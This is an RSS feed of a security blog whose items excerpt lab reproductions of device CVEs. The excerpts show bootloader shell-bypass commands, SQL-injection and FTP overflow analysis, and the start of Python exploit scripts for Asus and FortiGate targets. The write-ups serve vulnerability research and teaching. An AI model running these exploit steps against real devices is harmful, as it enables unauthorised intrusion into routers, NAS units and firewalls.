<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>vuln on CAI dog</title>
    <link>https://jellyfish-pro.github.io/posts/</link>
    <description>Recent content in vuln on CAI dog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language><atom:link href="https://jellyfish-pro.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[置顶] 注意事项</title>
      <link>https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid>
      <description>因为某些不可抗力，所以在您阅读以下文章时，会发现文章的结构有所缺失，请理解。 </description>
    </item>
    
    <item>
      <title>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2017-7921 海康威视权限绕过导致密码泄露漏洞 漏洞简介 该漏洞存在于海康威视摄像头设备上，因为逻辑错误，导致没有判断用户名和密码。
环境搭建 这里使用的是海康威视的摄像头设备(DS-2CD1301D-I)，因为这个设备没有telnet和ssh命令，所以无法远程直接连上去。因此这里是连接的串口，串口是由师兄之前测试其他漏洞的时候焊上去的，故这里不介绍如何连接串口。
修改psh 连接串口后，也无法直接获取shell，因为海康威视自己写了一个shell名叫psh，如果直接启动设备的话，会直接取得psh，如下：
如果想要绕过这个psh，我们则需要修改内核参数，拿到普通shell。
首先我们ctrl+U进入设置：
随后使用如下命令修改内核参数：
HKVS # printenv bootargs bootargs=console=ttyS0,115200 root=/dev/ram0 mem=42MHKVS # setenv bootargs console=ttyS0,115200 root=/dev/ram0 mem=42M singleHKVS # saveenv Saving Environment to SPI Flash...Erasing SPI flash...Writing to SPI flash...done 修改后使用reset命令重启：
需要注意的是，这里的内核还没有被加载，只是内核提供的一个手动启动内核的环境。因此我们在这里修改了psh后，再启动内核后，就可以获得正常的shell了。
#!/bin/bashrm /bin/pshtouch /bin/pshecho &amp;#34;#!/bin/bash&amp;#34; &amp;gt; /bin/pshecho &amp;#34;/bin/bash&amp;#34; &amp;gt;&amp;gt; /bin/pshchmod +x /bin/psh 随后执行linuxrc内核就可以获得普通的shell：
其实这个阶段如果不想手动修改psh的话，可以修改ip地址，使用挂载共享文件夹的方式，从共享文件夹中复制一个过来。
传递文件 虽然现在我们获得了正常的shell，但是设备上的busybox是被严重阉割过的，以至于连wget和curl命令都没有，也没有scp命令。没有这些命令，应该怎么传递文件呢？
我们可以使用nfs共享文件夹：
mount -t nfs 192.168.110.30:/tmp/nfs /run -o nolock 随后把要传输的文件复制到共享文件夹就好了。</description>
    </item>
    
    <item>
      <title>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
通过检查一下busybox，目的是检查该固件需要的位数和架构：
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功
随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：</description>
    </item>
    
    <item>
      <title>CVE-2022-1040 sophos身份验证绕过漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。
该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。
环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。
随后使用VMware打开.ova文件就可以直接搭建好sophos环境。
不过这里需要注意一点就是网卡的配置：
sophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：
像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。
这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0
接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。
第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。
配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：
json数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。
sophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：
通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。
Apache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。
sophos中的perl是指向csc的：
而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。
这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。
漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。
我们可以使用一个简单例子：
对于处理同样的数据：
{ &amp;quot;name\u0000ef&amp;quot;: &amp;quot;test&amp;quot;, &amp;quot;name&amp;quot;:&amp;quot;test2&amp;quot; }
对于java来说：
import org.json.JSONObject;import org.json.JSONException;import java.io.*;class test {public static void main(String[] args) {try{System.out.println(new JSONObject(&amp;#34;{ \&amp;#34;name\&amp;#34;: \&amp;#34;test\&amp;#34;, \&amp;#34;name\\u0000ef\&amp;#34;: \&amp;#34;test2\&amp;#34;}&amp;#34;));}catch (JSONException e){System.</description>
    </item>
    
    <item>
      <title>CVE-2022-26376 华硕固件内存崩溃漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/</guid>
      <description>CVE-2022-26376 华硕固件内存崩溃漏洞 漏洞简介 该漏洞存在于华硕固件和梅林固件中，不同型号对应的固件版本也不一致。如果想了解具体的型号，可以在NVD - CVE-2022-26376找到。
根据塔洛斯的说法：
A memory corruption vulnerability exists in the httpd unescape functionality of Asuswrt prior to 3.0.0.4.386_48706 and Asuswrt-Merlin New Gen prior to 386.7.. A specially-crafted HTTP request can lead to memory corruption. An attacker can send a network request to trigger this vulnerability.
这个漏洞会导致内存损坏。通过研究确实可以造成溢出，但并不能控制程序流。简言之就是，这个漏洞会造成内存损坏，但难以被利用。
漏洞分析 这里我使用的是梅林的386.5.2的源码
这里就是漏洞点，程序的大致流程为，判断字符串s中有没有百分号，如果有就利用sscanf函数对百分号和百分号后的两位进行解码，并将解码后的字符放在原百分号的位置，随后使用strlcpy和strncpy来覆盖百分号后两个字符。例如字符%41%42：
字符串中有百分号，使用sscanf函数对%41解码，并将解码出来的A放到原百分号的位置，字符变味了：A41%42 随后利用strlcpy将跳过**41将%42**放入s_tmp 最后，使用strncpy将%42接在A后面，原字符串就变为了：A%42 这就是一个解码url的循环。
乍一看，确实没问题，但是问题是如果我们将%41%42改了%41%a的话，就会出现问题：
第一轮解码，将会正常解析，字符串会变为：A%a
但当解析%a时就会出问题：
同样检测到百分号之后，使用sscanf函数对*%a进行解析，会解析为\n*，随后放到百分号的位置，字符串变为：A\na。 这时，strlcpy函数任然会读取原百分号（现在为\n）后两个字节放到s_tmp中。 这里我们可以看到，字符串中\n后只有一个字节（a）了。而strlcpy函数会读取\n后两个字节，这就说明会发生读取越界。
这里我们可以在设备上调试一下：
#!/usr/bin/python3import socketurl = b&amp;#34;GET /Main_Login.</description>
    </item>
    
    <item>
      <title>CVE-2022-27596 威联通5.0.1sql注入漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。
固件版本为：
该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。
环境搭建 这里是直接使用的设备(qnap TS-853 pro)
该设备可以直接通过ssh和telnet连接上shell：
连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell
漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。
针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：
[CVE-2022-27596 | CataLpa&amp;rsquo;s Home (wzt.ac.cn)]
该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。
静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中
该函数删除了符号，但可以通过搜索字符串找到。
v9 = s···if ( *(_QWORD *)(a8 + 24) ){v13 = *(const char **)(a8 + 24);v14 = strlen(s);a2 = &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;;sprintf(&amp;amp;s[v14], &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;, v13);}···v49 = sqlite3_mprintf(&amp;amp;byte_7FFFF76DFA7F, a2, v9);···v48 = sqlite3_mprintf(&amp;#34;SELECT * FROM QTOKEN %s %s %s;&amp;#34;, v49, v51, v50);···sqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到&amp;quot;AND token = &#39;%s&#39; &amp;quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制</description>
    </item>
    
    <item>
      <title>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。
环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。
因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。
当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录
执行下面的命令将pure-ftpd修改为西数的版本：
tar xf pure-ftpd_1.0.47.orig.tar.gzcd pure-ftpd-1.0.47.origfor patch_name in `ls ../patch`; do echo &amp;#34;--&amp;gt;patch name=$patch_name&amp;#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。
解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。
根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。
但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：
这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。
bin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。
刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：
这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录
而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：
可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。
将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init
**注意：**这里的路径是已经被挂载后的路径。
这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。
启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。
虽然环境不能启动，但是我们可以直接启动ftp服务呀。
我们可以直接启动ftp服务：
漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。
而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：
这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。
那么为什么要覆盖着loggedin呢？
其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：
动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：
但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。
故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent
其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。</description>
    </item>
    
    <item>
      <title>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-sslvpn-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
      <description>CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析 漏洞简介 该漏洞存在于Fortigate中的SSLVPN服务上，由于对Content-Length值的错误处理，并且没有控制数据包的长度，导致了堆溢出。
漏洞范围 5.0.0 &amp;lt;= FortiOS &amp;lt;= 5.0.145.2.0 &amp;lt;= FortiOS &amp;lt;= 5.2.155.4.0 &amp;lt;= FortiOS &amp;lt;= 5.4.135.6.0 &amp;lt;= FortiOS &amp;lt;= 5.6.146.0.0 &amp;lt;= FortiOS &amp;lt;= 6.0.156.2.0 &amp;lt;= FortiOS &amp;lt;= 6.2.116.4.0 &amp;lt;= FortiOS &amp;lt;= 6.4.107.0.0 &amp;lt;= FortiOS &amp;lt;= 7.0.87.2.0 &amp;lt;= FortiOS &amp;lt;= 7.2.21.0.0 &amp;lt;= Fortiproxy &amp;lt;= 1.0.71.1.0 &amp;lt;= Fortiproxy &amp;lt;= 1.1.61.2.0 &amp;lt;= Fortiproxy &amp;lt;= 1.2.132.0.0 &amp;lt;= Fortiproxy &amp;lt;= 2.</description>
    </item>
    
    <item>
      <title>CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</guid>
      <description>飞塔堆溢出漏洞利用方式 查看偏移 我们使用以下的脚本，发送包，查看偏移：
import socketimport sslfrom pwn import *import pwnpath = &amp;#34;/remote/login&amp;#34;.encode()ip = &amp;#34;192.168.113.66&amp;#34;port = 10443padding = b&amp;#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnza&amp;#39;def create_ssl_ctx():_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.connect((ip, port))_default_context = ssl._create_unverified_context()_socket = _default_context.wrap_socket(_socket)return _socketdef make_socks(payload):socks = []for i in range(60):sk = create_ssl_ctx()data = b&amp;#34;POST &amp;#34; + path + b&amp;#34; HTTP/1.1\r\nHost: 192.168.113.1\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;#34;sk.sendall(data)socks.append(sk)for i in range(20, 40, 2):sk = socks[i]sk.</description>
    </item>
    
    <item>
      <title>CVE-2022-46641 D-Link dir-846命令注入漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 + qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
